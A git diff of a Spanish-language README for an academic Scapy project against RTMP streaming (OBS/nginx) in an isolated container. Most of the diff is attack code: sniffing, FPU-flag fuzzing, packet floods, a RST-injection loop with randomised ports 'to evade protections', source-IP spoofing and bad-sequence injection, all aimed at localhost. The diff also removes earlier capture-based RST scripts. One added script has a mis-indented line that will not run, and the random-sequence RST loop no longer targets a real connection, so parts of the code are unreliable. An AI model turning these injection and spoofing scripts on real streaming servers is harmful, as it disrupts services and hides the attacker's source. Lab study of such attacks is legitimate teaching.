@@ -24,10 +24,13 @@ En esta entrega se explora la manipulación directa del protocolo RTMP a través
 
 ## Información general
 
-Este proyecto busca interceptar y modificar tráfico de red RTMP utilizando Scapy en un entorno aislado. La finalidad es explorar conceptos de seguridad, manipulación de paquetes TCP y respuesta de aplicaciones reales (OBS/VLC) frente a paquetes inyectados fuera de contexto.
+Proyecto académico para el análisis de vulnerabilidades en transmisiones RTMP mediante manipulación de paquetes con Scapy. El sistema implementa:
 
+✅ Sniffing de tráfico en tiempo real  
+✅ Inyección de paquetes maliciosos  
+✅ Técnicas de fuzzing y spoofing  
+✅ Ataques de interrupción de conexión 
 
-Se desarrolló como parte de una tarea académica en el área de redes y servicios.
 
 Objetivos:
 
@@ -67,6 +70,7 @@ Objetivos:
 
 ## Configuración
 
+
 1. Crear contenedor Debian con permisos de red:
 
 ```bash
@@ -87,36 +91,31 @@ Scripts Implementados:
 ```bash
 from scapy.all import *
 
-def ver(pkt):
-    if pkt.haslayer(TCP) and pkt[IP].dst == "127.0.0.1" and pkt[TCP].dport == 1935:
-        print(pkt.summary())
+def packet_handler(pkt):
+    if pkt.haslayer(TCP) and pkt[TCP].dport == 1935:
+        print(f"[RTMP] {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport} | Seq: {pkt[TCP].seq}")
 
-sniff(iface="lo", filter="tcp port 1935", prn=ver)
-
-```
-- sniff_seq.py
-```
-from scapy.all import *
-
-def capturar(pkt):
-    if pkt.haslayer(TCP) and pkt[IP].src == "127.0.0.1" and pkt[TCP].dport == 1935:
-        print("Puerto OBS:", pkt[TCP].sport)
-        print("Secuencia:", pkt[TCP].seq)
-        pkt.show()
-        return True
-
-sniff(filter="tcp and port 1935", prn=capturar, count=1)
+sniff(iface="lo", filter="tcp port 1935", prn=packet_handler)
 
 ```
-
 - fuzz1.py
 
 
 ```
 from scapy.all import *
+import time
 
-pkt = IP(dst="127.0.0.1")/TCP(dport=1935, flags="FPU")/Raw(load="fuzzing-test-1")
-send(pkt)
+
+target_ip = "127.0.0.1"
+target_port = 1935
+num_packets = 100  
+delay = 0.1 
+
+for i in range(num_packets):
+    # Construye el paquete con flags FPU + contador en el payload
+    pkt = IP(dst=target_ip)/TCP(dport=target_port, flags="FPU")/Raw(load=f"Fuzz-FPU-{i}")
+    send(pkt, verbose=0)  # verbose=0 para silenciar salida
+    time.sleep(delay) 
 
 ```
 
@@ -125,10 +124,29 @@ send(pkt)
 
 ```
 from scapy.all import *
+import time
 
-for i in range(100):
-    pkt = IP(dst="127.0.0.1")/TCP(dport=1935)/Raw(load="X"*2048)
-    send(pkt)
+# Configuraci  n avanzada
+target = "127.0.0.1"
+port = 1935
+packet_size = 2048  # bytes
+packet_count = 50    # N  mero de paquetes a enviar
+delay = 0.2          # Intervalo entre paquetes (segundos)
+
+print(f"[+] Enviando {packet_count} paquetes de {packet_size} bytes a {target}:{port}...")
+
+for i in range(1, packet_count + 1):
+    # Paquete con payload   nico (contador + caracteres aleatorios)
+    unique_payload = f"[PKT-{i}]".encode() + b"X" * (packet_size - 6)
+    
+    pkt = IP(dst=target)/TCP(dport=port)/Raw(load=unique_payload)
+    send(pkt, verbose=0)
+    
+    print(f"Enviado paquete {i}/{packet_count} | Bytes: {len(pkt)}", end="\r")
+    time.sleep(delay)
+
+print("\n[+] Inyeccion completada. Analiza en Wireshark.")
+
 
 ```
 - mod1_rst_real.py
@@ -147,73 +165,127 @@ print("Paquete RST enviado.")
 - mod1_auto.py
 ```
 from scapy.all import *
+import time
+import random
 
-print("Escuchando un paquete válido desde OBS hacia el servidor RTMP...")
+# Configuración
+target_ip = "127.0.0.1"
+target_port = 1935
+num_packets = 50  # Cantidad de paquetes RST a enviar
+delay = 0.1  # Segundos entre paquetes
 
-def capturar(pkt):
-    if pkt.haslayer(TCP) and pkt[IP].src == "127.0.0.1" and pkt[TCP].dport == 1935:
-        src_ip = pkt[IP].src
-        dst_ip = pkt[IP].dst
-        sport = pkt[TCP].sport
-        dport = pkt[TCP].dport
-        seq = pkt[TCP].seq + 1
+def send_rst_attack():
+    print(f"[+] Enviando {num_packets} paquetes RST a {target_ip}:{target_port}...")
+    
+    base_seq = random.randint(1000, 90000)  # Secuencia inicial aleatoria
+    
+    for i in range(num_packets):
+        # Variamos secuencia y puerto origen para evadir posibles protecciones
+        seq = base_seq + i
+        sport = random.randint(49152, 65535)  # Puerto origen aleatorio (rango efímero)
+        
+        # Construimos el paquete RST con diferentes opciones
+        pkt = IP(dst=target_ip)/TCP(
+            sport=sport,
+            dport=target_port,
+            flags="R",
+            seq=seq,
+            window=0  # Ventana cero para mayor efectividad
+        )/Raw(load=f"RST-{i}")  # Payload identificador
+        
+        send(pkt, verbose=0)
+        print(f"Enviado RST {i+1}/{num_packets} | SEQ: {seq} | SPORT: {sport}", end="\r")
+        time.sleep(delay)
+    
+    print("\n[+] Ataque RST completado")
 
-        print(f" Paquete capturado: {src_ip}:{sport} → {dst_ip}:{dport}, seq={seq}")
-        ip = IP(src=src_ip, dst=dst_ip)
-        tcp = TCP(sport=sport, dport=dport, flags="R", seq=seq)
-        send(ip/tcp)
-        print(" Paquete RST enviado con éxito.")
-        return True
-
-sniff(filter="tcp and port 1935", prn=capturar, count=1)
-
+send_rst_attack()
 ```
 
-- mod1_burst.py
-
-
-```
-from scapy.all import *
-
-print(" Buscando paquete OBS → nginx para lanzar ataque burst RST...")
-
-def capturar(pkt):
-    if pkt.haslayer(TCP) and pkt[IP].dst == "172.18.0.2" and pkt[TCP].dport == 1935:
-        src_ip = pkt[IP].src
-        dst_ip = pkt[IP].dst
-        sport = pkt[TCP].sport
-        dport = pkt[TCP].dport
-        base_seq = pkt[TCP].seq
-
-        for offset in range(20):
-            seq = base_seq + offset
-            ip = IP(src=src_ip, dst=dst_ip)
-            tcp = TCP(sport=sport, dport=dport, flags="R", seq=seq)
-            send(ip/tcp, verbose=0)
-
-        print(" Ataque RST burst enviado.")
-        return True
-
-sniff(filter="tcp and dst port 1935", prn=capturar, count=1)
-
-```
 - mod2_spoof.py
 
 
 ```
 from scapy.all import *
+import random
+import time
 
-pkt = IP(src="10.10.10.10", dst="127.0.0.1")/TCP(dport=1935)/Raw(load="spoofed")
-send(pkt)
+# Configuración
+target_ip = "127.0.0.1"
+target_port = 1935
+spoofed_ip_base = "10.10.10."
+num_packets = 100 
+delay = 0.1  
+def send_spoofed_packets():
+    print(f"[+] Enviando {num_packets} paquetes spoofed a {target_ip}:{target_port}...")
+    
+    for i in range(num_packets):
+        # Generamos IP origen spoofed diferente para cada paquete
+        spoofed_ip = spoofed_ip_base + str(random.randint(1, 254))
+        
+        # Variamos parámetros TCP para cada paquete
+        sport = random.randint(1024, 65535)  
+        seq = random.randint(100000, 900000) 
+        window = random.randint(512, 65535)  
+        
+        # Creamos el paquete con diferentes características
+        pkt = IP(src=spoofed_ip, dst=target_ip, ttl=random.randint(32, 255))/TCP(
+            sport=sport,
+            dport=target_port,
+            seq=seq,
+            window=window,
+            flags=random.choice(["S", "A", "PA"])  # Flags aleatorios
+        )/Raw(load=f"SPOOFED-{i}-{spoofed_ip}")  # Payload identificador
+        
+        send(pkt, verbose=0)
+        print(f"Enviado paquete {i+1}/{num_packets} | IP: {spoofed_ip} | SPORT: {sport}", end="\r")
+        time.sleep(delay)
+    
+    print("\n[+] Ataque de spoofing completado")
+
+send_spoofed_packets()
 
 ```
 - mod3_seq.py
 
 ```
 from scapy.all import *
+import random
+import time
 
-pkt = IP(dst="127.0.0.1")/TCP(dport=1935, seq=999999)/Raw(load="bad-seq")
-send(pkt)
+# Configuración avanzada
+target_ip = "127.0.0.1"
+target_port = 1935
+num_packets = 50           
+base_delay = 0.1           
+jitter = 0.05              
+
+def send_bad_sequence_attack():
+    print(f"[+] Iniciando ataque de secuencia inválida a {target_ip}:{target_port}")
+    
+    for i in range(1, num_packets + 1):
+        # Generamos valores aleatorios para cada paquete
+        seq = random.randint(900000, 9999999)  # Secuencia claramente fuera de rango
+        sport = random.randint(49152, 65535)   # Puerto origen aleatorio (rango efímero)
+        ttl = random.randint(16, 255)          # TTL variable
+        
+        pkt = IP(dst=target_ip, ttl=ttl)/TCP(
+            sport=sport,
+            dport=target_port,
+            seq=seq,
+            window=random.randint(512, 65535),  # Ventana TCP variable
+            flags=random.choice(["S", "A", "PA", "FA"])  # Flags aleatorios
+        )/Raw(load=f"BAD-SEQ-{i}-{seq}")  # Payload identificador
+        
+        send(pkt, verbose=0)
+                current_delay = base_delay + random.uniform(-jitter, jitter)
+        time.sleep(max(0.01, current_delay))  # Nunca menor a 10ms
+        
+        print(f"Enviado {i}/{num_packets} | SEQ: {seq} | SPORT: {sport} | TTL: {ttl}", end="\r")
+    
+    print("\n[+] Ataque completado")
+
+send_bad_sequence_attack()
 
 ```
 ##  Pruebas Realizadas
